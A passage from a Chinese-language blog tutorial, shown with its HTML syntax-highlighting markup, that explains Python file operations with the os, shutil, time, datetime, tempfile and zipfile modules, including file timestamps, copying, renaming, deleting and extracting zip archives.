punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">1052</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584868409</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385005</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1587221906</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1587221904</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385002</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385002</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584930910</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">16895</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385002</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584868229</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>stat_result<span class="token punctuation">(</span>st_mode<span class="token operator">=</span><span class="token number">33206</span><span class="token punctuation">,</span> st_ino<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_dev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_nlink<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_uid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_gid<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> st_size<span class="token operator">=</span><span class="token number">2627</span><span class="token punctuation">,</span> st_atime<span class="token operator">=</span><span class="token number">1587385020</span><span class="token punctuation">,</span> st_mtime<span class="token operator">=</span><span class="token number">1584870887</span><span class="token punctuation">,</span> st_ctime<span class="token operator">=</span><span class="token number">1584779579</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>st_size:文件的体积大小(bytes)，除以1024就是KB  </li><li>st_atime:文件的最近访问时间</li><li>st_mtime:文件的最近修改时间</li><li>st_ctime:Windows下表示创建时间</li><li>st_birthtime:只在Mac,Linux下可用，表示创建时间</li></ul><p>上面的时间都是类似1584868409这样的数字，这种时间叫做Unix时间戳，可以利用Python转换为正常日期时间</p><h4 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a>time模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> time<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>scandir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>stat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>st_mtime<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span>deploy_git Sat Apr <span class="token number">18</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">55</span> <span class="token number">2020</span><span class="token punctuation">.</span>gitignore Sat Mar <span class="token number">21</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">59</span> <span class="token number">2020</span><span class="token punctuation">.</span>vscode Sun Mar <span class="token number">22</span> <span class="token number">18</span><span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token number">10</span> <span class="token number">2020</span>db<span class="token punctuation">.</span>json Sat Apr <span class="token number">18</span> <span class="token number">23</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token number">51</span> <span class="token number">2020</span>node_modules Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>package<span class="token operator">-</span>lock<span class="token punctuation">.</span>json Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>package<span class="token punctuation">.</span>json Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>public Sat Apr <span class="token number">18</span> <span class="token number">22</span><span class="token punctuation">:</span><span class="token number">58</span><span class="token punctuation">:</span><span class="token number">26</span> <span class="token number">2020</span>scaffolds Sat Mar <span class="token number">21</span> <span class="token number">16</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token number">59</span> <span class="token number">2020</span>source Mon Mar <span class="token number">23</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">35</span><span class="token punctuation">:</span><span class="token number">10</span> <span class="token number">2020</span>themes Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">29</span> <span class="token number">2020</span>_config<span class="token punctuation">.</span>yml Sun Mar <span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">54</span><span class="token punctuation">:</span><span class="token number">47</span> <span class="token number">2020</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="datetime模块"><a href="#datetime模块" class="headerlink" title="datetime模块"></a>datetime模块</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> datetime<span class="token operator">>></span><span class="token operator">></span> a<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>fromtimestamp<span class="token punctuation">(</span><span class="token number">1584868409</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">22</span> <span class="token number">17</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>hour<span class="token punctuation">,</span>a<span class="token punctuation">.</span>minute<span class="token punctuation">,</span>a<span class="token punctuation">.</span>second<span class="token punctuation">,</span>a<span class="token punctuation">.</span>year<span class="token punctuation">,</span>a<span class="token punctuation">.</span>month<span class="token punctuation">,</span>a<span class="token punctuation">.</span>day<span class="token punctuation">)</span> <span class="token number">17</span> <span class="token number">13</span> <span class="token number">29</span> <span class="token number">2020</span> <span class="token number">3</span> <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="写入，读取文件"><a href="#写入，读取文件" class="headerlink" title="写入，读取文件"></a>写入，读取文件</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'.gitignore'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token operator">>></span><span class="token operator">></span> text<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'.DS_Store\n'</span><span class="token punctuation">,</span> <span class="token string">'Thumbs.db\n'</span><span class="token punctuation">,</span> <span class="token string">'db.json\n'</span><span class="token punctuation">,</span> <span class="token string">'*.log\n'</span><span class="token punctuation">,</span> <span class="token string">'node_modules/\n'</span><span class="token punctuation">,</span> <span class="token string">'public/\n'</span><span class="token punctuation">,</span> <span class="token string">'.deploy*/'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一种建议的写法，不管程序是否正常运行都会关闭文件，不需要再单独写close()</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'.gitignore'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     text<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">[</span><span class="token string">'.DS_Store\n'</span><span class="token punctuation">,</span> <span class="token string">'Thumbs.db\n'</span><span class="token punctuation">,</span> <span class="token string">'db.json\n'</span><span class="token punctuation">,</span> <span class="token string">'*.log\n'</span><span class="token punctuation">,</span> <span class="token string">'node_modules/\n'</span><span class="token punctuation">,</span> <span class="token string">'public/\n'</span><span class="token punctuation">,</span> <span class="token string">'.deploy*/'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     text<span class="token operator">=</span><span class="token string">'first line\nsecondline\n'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>‘w’表示写入，若文件不存在则会创建新文件，若存在，则会将文件原内容清空，然后写入内容  </li><li>‘a’表示追加，若件不存在则会创建新文件，若存在，则会在文件最后追加内容，而不清空原内容</li></ul><h3 id="创建临时文件及文件夹"><a href="#创建临时文件及文件夹" class="headerlink" title="创建临时文件及文件夹"></a>创建临时文件及文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tempfile <span class="token keyword">import</span> TemporaryFile<span class="token keyword">with</span> TemporaryFile<span class="token punctuation">(</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>‘w+’表示写入及读取文件      </li><li>seek(0)表示回到文件开头位置    </li><li>在程序运行完之后会自动删掉临时文件     </li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tempfile <span class="token keyword">import</span> TemporaryDirectory<span class="token keyword">with</span> TemporaryDirectory<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> tmp_folder<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'临时文件夹已创建：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp_folder<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>PS F<span class="token punctuation">:</span>\blog\hexo<span class="token operator">></span> python <span class="token operator">-</span>u <span class="token string">"f:\blog\hexo\source\_posts\1.py"</span>临时文件夹已创建：E<span class="token punctuation">:</span>\Temp\tmp8mcwp0aw<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="批量操作文件及文件夹"><a href="#批量操作文件及文件夹" class="headerlink" title="批量操作文件及文件夹"></a>批量操作文件及文件夹</h2><h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'newdir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="检测文件夹是否存在"><a href="#检测文件夹是否存在" class="headerlink" title="检测文件夹是否存在"></a>检测文件夹是否存在</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'newdir'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'newdir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="创建多层文件夹"><a href="#创建多层文件夹" class="headerlink" title="创建多层文件夹"></a>创建多层文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span><span class="token string">'1/2/3'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="复制、移动、重命名"><a href="#复制、移动、重命名" class="headerlink" title="复制、移动、重命名"></a>复制、移动、重命名</h3><p>使用shutil模块</p><h4 id="复制文件有两种使用方式"><a href="#复制文件有两种使用方式" class="headerlink" title="复制文件有两种使用方式"></a>复制文件有两种使用方式</h4><ol><li>第二个参数写某个文件夹位置，则复制到该文件夹下</li><li>第二个参数写某个文件路径，复制到这个路径并且重命名</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> shutil<span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'./sqlmap'</span><span class="token punctuation">)</span><span class="token string">'./sqlmap\\mysql.txt'</span><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'./sqlmap/2.txt'</span><span class="token punctuation">)</span> <span class="token string">'./sqlmap/2.txt'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复制文件夹"><a href="#复制文件夹" class="headerlink" title="复制文件夹"></a>复制文件夹</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>copytree<span class="token punctuation">(</span><span class="token string">'GAME'</span><span class="token punctuation">,</span><span class="token string">'game2'</span><span class="token punctuation">)</span><span class="token string">'game2'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="移动文件或文件夹"><a href="#移动文件或文件夹" class="headerlink" title="移动文件或文件夹"></a>移动文件或文件夹</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'GAME/'</span><span class="token punctuation">)</span><span class="token string">'GAME/mysql.txt'</span><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'GAME/2.txt'</span><span class="token punctuation">)</span> <span class="token string">'GAME/2.txt'</span><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>move<span class="token punctuation">(</span><span class="token string">'GAME'</span><span class="token punctuation">,</span><span class="token string">'sqlmap/'</span><span class="token punctuation">)</span><span class="token string">'sqlmap/GAME'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>记住第二个参数若为文件夹最后要加斜杠/</p></blockquote><h4 id="重命名文件或文件夹"><a href="#重命名文件或文件夹" class="headerlink" title="重命名文件或文件夹"></a>重命名文件或文件夹</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string">'mysql.txt'</span><span class="token punctuation">,</span><span class="token string">'database_notes.txt'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token string">'GAME'</span><span class="token punctuation">,</span><span class="token string">'LOL'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>只能删文件，如果给了一个文件夹路径则会报错</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'remove.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="删除文件夹"><a href="#删除文件夹" class="headerlink" title="删除文件夹"></a>删除文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span><span class="token string">'remove'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建和解压压缩包"><a href="#创建和解压压缩包" class="headerlink" title="创建和解压压缩包"></a>创建和解压压缩包</h2><h3 id="读取压缩包"><a href="#读取压缩包" class="headerlink" title="读取压缩包"></a>读取压缩包</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> zipfile<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>zipobj<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">[</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span> <span class="token string">'2.txt'</span><span class="token punctuation">,</span> <span class="token string">'3.txt'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若文件列表中有中文文件名，则需要调整编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">for</span> filename <span class="token keyword">in</span> zipobj<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'cp437'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">1.</span>txt<span class="token number">2.</span>txt<span class="token number">3.</span>txt中文<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">for</span> filename <span class="token keyword">in</span> zipobj<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             info<span class="token operator">=</span>zipobj<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             new_filename<span class="token operator">=</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'cp437'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>new_filename<span class="token punctuation">,</span>info<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token number">1.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'1.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span class="token number">2.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'2.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span class="token number">3.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'3.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span>中文<span class="token punctuation">.</span>txt <span class="token operator">&lt;</span>ZipInfo filename<span class="token operator">=</span><span class="token string">'╓╨╬─.txt'</span> external_attr<span class="token operator">=</span><span class="token number">0x20</span> file_size<span class="token operator">=</span><span class="token number">0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>info属性：   </p><ul><li>.file_size 原始文件大小</li><li>.compress_size 压缩后大小<br>单位为字节</li></ul><h3 id="解压压缩包"><a href="#解压压缩包" class="headerlink" title="解压压缩包"></a>解压压缩包</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>extract<span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解压所有文件，可选参数为path</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">'./extract/'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>若压缩包有密码，则使用可选参数pwd</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'yasuo.zip'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zipobj<span class="token punctuation">:</span>    zipobj<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span><span class="token string">'./extract/'</span><span class="token punctuation">,</span>pwd<span class="token operator">=</span><span class="token string">b'123'</span><span class="token punctuation">)</span><span aria-hidden="true" 